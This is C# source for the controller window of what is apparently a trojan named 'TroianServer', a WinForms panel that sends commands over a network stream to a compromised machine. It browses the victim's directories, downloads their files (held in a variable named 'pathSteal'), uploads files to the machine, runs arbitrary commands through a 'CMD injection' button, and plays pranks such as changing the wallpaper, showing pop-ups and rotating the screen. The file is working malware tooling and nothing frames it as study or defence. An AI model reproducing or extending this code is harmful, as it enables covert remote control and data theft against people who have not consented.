using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace TroianServer
{
    public partial class Form1 : Form
    {
        bool ox = false;
        bool oy = false;
        NetworkStream ns;
        int rotateDegrees = 0;
        String Popupt1 = "";
        String Popupt2 = "";
        String WallPaperURL = "";
        String dir = "";
        String pathSteal = "";
        String inject = "";
        String pathInject = "";
        String pathCopy = "";
        public Form1(NetworkStream stream)
        {
            ns = stream;
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e) // Stop
        {
            Messages.SendMessage(ns, Constants.CLOSE.ToString());
        }

        private void ChangeWall_Click(object sender, EventArgs e)
        {
            String cmd = "4@" + WallPaperURL;
            Messages.SendMessage(ns, cmd);
        }

        private void PopUp_Click(object sender, EventArgs e)
        {
            String cmd = "5@" + Popupt1 + "@" + Popupt2;
            Messages.SendMessage(ns, cmd);

        }

        private void RotateButton_Click(object sender, EventArgs e)
        {
            String cmd = "6@" + rotateDegrees.ToString();
            Messages.SendMessage(ns, cmd);

        }

        private void InvertButton_Click(object sender, EventArgs e)
        {
            String cmd = "1@" + ox.ToString() + "@" + oy.ToString();
            Console.Write(cmd);
            Messages.SendMessage(ns, cmd);
        }

        private void Ox_CheckedChanged(object sender, EventArgs e)
        {
            ox = !ox;

        }

        private void OY_CheckedChanged(object sender, EventArgs e)
        {
             oy = !oy;
        }

        private void RotateDegrees_TextChanged(object sender, EventArgs e)
        {
          rotateDegrees = int.Parse(RotateDegrees.Text)/90;

        }

        private void PopUpText_TextChanged(object sender, EventArgs e)
        {
           Popupt1 = PopUpText.Text;
        }

        private void WallpaperURL_TextChanged(object sender, EventArgs e)
        {
            WallPaperURL = WallpaperURL.Text;
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            richTextBox1.Clear();
            String path = Constants.NAVIGATE + "@" + dir;
            Messages.SendMessage(ns, path);
            String msn = Messages.ReceiveMessage(ns);
            Console.WriteLine(msn);
            if (msn.Equals("N"))
            {
                richTextBox1.AppendText("Path cannot be found \n");
                return;
            }

            int files = Int32.Parse(Messages.ReceiveMessage(ns));
            Messages.SendMessage(ns, "ACK");
            String[] dirs = new string[files];

            for (int i = 0; i < files; i++)
            {
                dirs[i] = Messages.ReceiveMessage(ns);
                Messages.SendMessage(ns, "ACK");
            }

            for (int i = 0; i < files; i++)
                richTextBox1.AppendText(dirs[i] + "\n");
   
        }

        private void Popup2_TextChanged(object sender, EventArgs e)
        {
            Popupt2 = Popup2.Text;
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void NavigateDir_TextChanged(object sender, EventArgs e)
        {
            dir = NavigateDir.Text;
        }

        private void GetFile_Click(object sender, EventArgs e)
        {
            String cmd = Constants.RECFILE + "@" + pathSteal;
            Messages.SendMessage(ns, cmd);
            String ans = Messages.ReceiveMessage(ns);
            String fileName = Directory.GetCurrentDirectory() + "\\" + ans;
            int bytes_sent = -1;
            Byte[] bytes = new Byte[1024];

            if (ans.Equals("!!"))
                return;

            Messages.SendMessage(ns, "ACK");
            try
            {
                using (var fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
                {
                    while(bytes_sent != 0)
                    {
                        Console.WriteLine(bytes_sent.ToString());
                        bytes_sent = Int32.Parse(Messages.ReceiveMessage(ns));
                        Messages.SendMessage(ns, "ACK");

                        if(bytes_sent > 0)
                            Console.WriteLine(ns.Read(bytes, 0, bytes_sent));
                        Messages.SendMessage(ns, "ACK");
                        fs.Write(bytes, 0, bytes_sent);
                    }
                    fs.Close();
                    
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception caught in process", ex);
            }

        }

        private void GetFileName_TextChanged(object sender, EventArgs e)
        {
            pathSteal = GetFileName.Text;
        }

        private void Custom_Click(object sender, EventArgs e) // CMD injection
        {
            Messages.SendMessage(ns, Constants.CMDINJECT + "@" + inject);
        }

        private void CustomCommand_TextChanged(object sender, EventArgs e)
        {
            inject = CustomCommand.Text;
        }

        private void SendFileName_TextChanged(object sender, EventArgs e)
        {
            pathInject = SendFileName.Text;
        }

        private void SendFile_Click(object sender, EventArgs e)
        {
            int bytes_sent = -1;
            Byte[] bytes = new Byte[1024];

            try
            {
                FileStream fs = new FileStream(pathInject, FileMode.Open, FileAccess.Read);
                Messages.SendMessage(ns, Constants.SENDFILE + "@" + pathCopy);
                String check = Messages.ReceiveMessage(ns);

                if (check.Equals("N"))
                {
                    richTextBox1.Clear();
                    richTextBox1.AppendText("Nu am putut crea fisierul, scuze!");
                    return;
                }

                while (bytes_sent != 0)
                {
                    bytes_sent = fs.Read(bytes, 0, bytes.Length);
                    Messages.SendMessage(ns, bytes_sent.ToString());
                    Messages.ReceiveMessage(ns);
                    ns.Write(bytes, 0, bytes_sent);
                    Messages.ReceiveMessage(ns);
                }
            }
            catch (Exception) { }
        }

        private void copyPath_TextChanged(object sender, EventArgs e)
        {
            pathCopy = copyPath.Text;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Messages.SendMessage(ns, Constants.CLOSE.ToString());
        }
    }
}
